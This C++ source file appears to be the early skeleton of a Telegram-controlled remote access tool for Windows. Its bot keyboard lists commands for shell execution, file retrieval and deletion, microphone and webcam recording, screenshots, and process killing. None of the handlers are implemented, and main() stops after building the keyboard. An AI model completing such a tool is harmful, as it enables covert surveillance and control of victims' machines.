#include <csignal>
#include <cstdio>
#include <cstdlib>
#include <exception>
#include <string>
#include <vector>

#include <direct.h>
#include <cstdio>
#include <iostream>

#include <filesystem>
#include <typeinfo>
#include <cstdint>

#include "tgbot\tgbot.h"

using namespace std;
using namespace TgBot;

#define getcwd _getcwd
#define chdir _chdir


void createOneColumnKeyboard(const vector<string>& buttonStrings, ReplyKeyboardMarkup::Ptr& kb)
{
    for (size_t i = 0; i < buttonStrings.size(); ++i) {
        vector<KeyboardButton::Ptr> row;
        KeyboardButton::Ptr button(new KeyboardButton);
        button->text = buttonStrings[i];
        row.push_back(button);
        kb->keyboard.push_back(row);
    }
}

void createKeyboard(const vector<vector<string>>& buttonLayout, ReplyKeyboardMarkup::Ptr& kb)
{
    for (size_t i = 0; i < buttonLayout.size(); ++i) {
        vector<KeyboardButton::Ptr> row;
        for (size_t j = 0; j < buttonLayout[i].size(); ++j) {
            KeyboardButton::Ptr button(new KeyboardButton);
            button->text = buttonLayout[i][j];
            row.push_back(button);
        }
        kb->keyboard.push_back(row);
    }
}

string GetInfoCmd()
{
    std::string line;
    std::string info;

    std::ifstream in("m.txt");
    if (in.is_open()) {
        while (std::getline(in, line))
        {
            info += line;
            info += "\n";
        }
    }
    in.close();

    return info;
}

int main() {
    Bot bot("your token");

    /*ReplyKeyboardMarkup::Ptr keyboardOneCol(new ReplyKeyboardMarkup);
    createOneColumnKeyboard({ "Option 1", "Option 2", "Option 3" }, keyboardOneCol);*/

    ReplyKeyboardMarkup::Ptr keyboardWithLayout(new ReplyKeyboardMarkup); // Создание клавиатуры тг бота
    createKeyboard({
        {"/cd", "/chdir", "/dir", "/rm_file"},
        {"/get_file", "/exec_cmd"},
        {"/rec_micro", "/get_audio"},
        {"/rec_video", "/get_video"},
        {"/screenshot", "/get_screen"},
        {"/taskill", "/tasklist"}
        }, keyboardWithLayout);

    string last_cmd = "";
}